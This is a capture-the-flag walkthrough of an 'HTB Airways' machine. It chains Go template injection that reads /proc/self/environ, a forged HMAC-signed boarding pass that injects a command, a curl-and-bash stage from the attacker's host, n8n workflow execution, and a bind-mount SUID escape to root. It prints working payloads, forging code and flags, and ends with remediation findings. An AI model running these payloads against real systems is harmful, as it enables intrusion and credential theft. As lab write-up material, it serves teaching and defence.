01Scoped enumeration

I started with a full TCP scan against the assigned machine only. Two services were exposed: OpenSSH on 22 and nginx on 80. The web application identified itself as HTB Airways and implemented the booking workflow in Go. 

sudo nmap -Pn -sC -sV -p- --min-rate 1500 <target-ip>

# 22/tcp open  ssh   OpenSSH 10.0p2 Debian
# 80/tcp open  http  nginx

The application allowed public registration. After signing in, the normal journey was: add a payment card, search for an upcoming flight, choose a seat, add passenger details, pay, download the ticket and check in with a QR-backed boarding pass.

02Map the booking workflow

A future flight was required because completed or expired schedules could not produce a valid check-in. Rather than hard-code an old identifier, I searched the current date range and extracted the live schedule identifiers from /search/results. 

POST /sign-up
POST /sign-in
POST /payment-cards
GET  /search/results?origin=<airport>&destination=<airport>&date=<date>
GET  /schedules/<schedule-id>
POST /book/start
POST /book/<PNR>/passengers
POST /book/<PNR>/payment

A completed booking exposed a notes feature and generated both an HTML preview and a downloadable PDF. Notes were the first useful user-controlled value rendered into server-generated output.

03Go template injection in ticket notes

The notes field was evaluated as a Go text/template. This was not Jinja-style arithmetic; Go-specific probes such as {{print 777}}, {{.}} and {{printf "%#v" .}} were the useful indicators.

The template context exposed a .File method. Supplying a path caused the application to read it and place the result in the ticket preview and PDF: 

{{.File "/etc/hostname"}}
{{.File "/proc/self/environ"}}
curl -sS -b cookies.txt \
  -X POST "http://<target-ip>/tickets/<PNR>/notes" \
  --data-urlencode 'notes={{.File "/proc/self/environ"}}'

curl -sS -b cookies.txt \
  "http://<target-ip>/tickets/<PNR>/download" \
  -o ticket.pdf

pdftotext -layout ticket.pdf - | tr '\0' '\n'

Reading the PDF was important because environment values are separated by NUL bytes, which made the browser preview less reliable than the extracted document text.

Root cause

A file-read primitive reached the process environment

The template context combined attacker-controlled template syntax with a privileged file helper. Secrets stored in the process environment then converted a file-read issue into authenticated message forgery and access to an internal automation platform.

05Understand the signed boarding pass

The check-in page supplied qr_data as Base64. Decoding it showed a Go Gob message followed by a 32-byte HMAC-SHA256 signature. The embedded JSON carried the booking identity and a notification command. 

qr_data = base64( gob_message || hmac_sha256(validation_key, gob_message) )

JSON fields:
  PNR
  Token
  Seat
  Passenger
  NotifyCmd

A real, unused booking was still required: the application verified the signature and then marked the PNR as used. The safe way to validate the recovered HMAC key was to sign the original Gob data and compare the result with the supplied signature before changing anything. 

raw = base64.b64decode(qr_data)
gob_data, original_signature = raw[:-32], raw[-32:]

check = hmac.new(validation_key, gob_data, hashlib.sha256).digest()
assert hmac.compare_digest(check, original_signature)

06Rebuild the Gob message and forge NotifyCmd

The type-definition portion of the Gob stream could be copied unchanged. Only the length-prefixed value message needed rebuilding after replacing NotifyCmd in the JSON. 

def gobuint(value):
    if value < 128:
        return bytes([value])
    encoded = value.to_bytes((value.bit_length() + 7) // 8, "big")
    return bytes([256 - len(encoded)]) + encoded

new_json = json.dumps(ticket, separators=(",", ":")).encode()
inner = b"\x01" + gobuint(len(new_json)) + new_json + b"\x00"
structure = gobuint(len(inner)) + inner
value_message = type_id + structure
forged_gob = type_definition + gobuint(len(value_message)) + value_message
signature = hmac.new(validation_key, forged_gob, hashlib.sha256).digest()
forged_qr = base64.b64encode(forged_gob + signature)

A harmless proof copied the target hostname to a temporary file:

NotifyCmd = cp /etc/hostname /tmp/takeoff-proof

Posting the forged value to /api/check-in returned a successful redirect. Reading the temporary file back through .File returned the hostname, proving execution as the web-service account.

07Stage arbitrary shell commands

NotifyCmd was split into arguments and executed without a shell. Pipes, redirection and command substitution therefore did not work directly. I used the command twice: first to download a controlled shell script, then to execute it through Bash. 

curl http://<tun0-ip>:8000/stage.sh -o /tmp/stage.sh
bash /tmp/stage.sh
python3 -m http.server 8000 --directory ./payloads

The staged script wrote command output to a world-readable temporary file. The SSTI file-read primitive then returned that output without requiring an interactive reverse shell.

08Pivot into n8n

Local enumeration showed n8n listening on 127.0.0.1:5678. The leaked API key authenticated to its public REST API. From the web-service context, I created and activated a temporary workflow containing a Webhook node connected to an Execute Command node. 

import json

path = "<random-path>"
command = "{ id; } 2>&1; true"

workflow = {
    "name": path,
    "nodes": [
        {
            "parameters": {
                "httpMethod": "POST",
                "path": path,
                "responseMode": "lastNode",
            },
            "id": "webhook",
            "name": "Webhook",
            "type": "n8n-nodes-base.webhook",
            "typeVersion": 2,
            "position": [200, 300],
            "webhookId": path,
        },
        {
            "parameters": {"command": command},
            "id": "exec",
            "name": "Exec",
            "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1,
            "position": [420, 300],
        },
    ],
    "connections": {
        "Webhook": {
            "main": [[{"node": "Exec", "type": "main", "index": 0}]]
        }
    },
    "settings": {},
}

open("/tmp/workflow.json", "w").write(json.dumps(workflow))
BASE=http://127.0.0.1:5678
KEY='<redacted-api-key>'

CREATE=$(curl -sS \
  -H "X-N8N-API-KEY: $KEY" \
  -H 'Content-Type: application/json' \
  -X POST "$BASE/api/v1/workflows" \
  --data-binary @/tmp/workflow.json)

ID=$(printf '%s' "$CREATE" | grep -oP '"id":"\K[^"]+' | head -1)

curl -sS -H "X-N8N-API-KEY: $KEY" \
  -X POST "$BASE/api/v1/workflows/$ID/activate"

curl -sS -X POST "$BASE/webhook/<random-path>" \
  -H 'Content-Type: application/json' -d '{}'

Invoking the webhook returned uid=0(root). This was root inside an Alpine-based container, not yet root on the Debian host.

09Identify the host bind mount

Container checks found no Docker socket, useful block devices or an immediately exploitable capability set. The important result was in /proc/mounts: 

/dev/sda4 /root ext4 rw,relatime,errors=remount-ro 0 0

The container's /root mapped to the host's /home/kpark. It was writable and did not use nosuid. Container-root could therefore write files into the host user's home directory and change their ownership and mode on the shared filesystem.

10Write an SSH key and recover user.txt

I generated a dedicated key on Kali and used the n8n command node to install the public key:

# Kali
ssh-keygen -t ed25519 -f ./takeoff_key -N '' -C takeoff

# Executed by container-root through n8n
mkdir -p /root/.ssh
printf '%s\n' '<public-key>' > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chown -R 1001:1001 /root/.ssh
ssh -i ./takeoff_key kpark@<target-ip> 'id; cat ~/user.txt'

# uid=1001(kpark) gid=1001(kpark)
user.txtd5baee70798ce26fe3d1ca41ed8159a5

11Turn the bind mount into host root

The container used BusyBox, so its shell was not suitable for the final escalation. As kpark, I copied the host's Debian Bash binary into the bind-mounted home directory. Container-root then changed the owner to root and enabled the SUID bit on the same inode. 

# Host session as kpark
cp /bin/bash ~/mybash
chmod 755 ~/mybash

# n8n container as root: /root == host /home/kpark
chown 0:0 /root/mybash
chmod 4755 /root/mybash
ls -la /root/mybash

# -rwsr-xr-x 1 root root ... /root/mybash

Back on the host, -p preserved the effective UID:

~/mybash -p -c 'id; cat /root/root.txt'

# uid=1001(kpark) euid=0(root)
root.txt61c79862c4188e9860e79978d1e791f7

13Lessons from the path

  • Identify the template engine first. Go template behaviour was materially different from Jinja or Twig.
  • File read became authentication bypass. Environment secrets were more valuable than ordinary configuration files.
  • Signed data is only as strong as key isolation. HMAC prevented tampering until the signing key was disclosed.
  • Valid business state still mattered. A forged boarding pass needed a real, future, unused booking.
  • Command execution was not automatically a shell. Understanding argument splitting led to a reliable two-stage payload.
  • Container root was a boundary, not the finish. The writable host bind mount supplied the actual escape path.
  • Mount options matter. The absence of nosuid allowed a mode change inside the container to affect host execution.

14If this were your environment

Finding 1 · Critical

Server-side template injection with arbitrary file read

Store ticket notes as data and render them with escaping enabled. Do not parse user content as templates, and never expose general-purpose file helpers to a template context.

Finding 2 · Critical

Secrets in the web-service environment enabled ticket forgery and internal API access

Separate signing and automation credentials from the public web process. Use short-lived scoped secrets, rotate them after disclosure, and prevent diagnostic or document-generation paths from reading process environment files.

Finding 3 · Critical

Signed client data controlled a server-side command

Do not place executable commands in client-controlled tickets. Represent notification actions as fixed server-side identifiers and map them to allowlisted operations after independent authorisation checks.

Finding 4 · Critical

Internal n8n API key permitted arbitrary command workflows

Restrict the API to a dedicated management network, disable Execute Command nodes where they are not required, enforce least-privilege service accounts, rotate API keys and alert on workflow creation or activation by non-administrative services.

Finding 5 · Critical

Writable host home bind-mounted into a root container without nosuid

Avoid mounting user home directories into containers. Where a mount is unavoidable, make it read-only and use nosuid, nodev and noexec. Run the container as a non-root UID and use user-namespace remapping so container-root cannot assign host-root ownership.
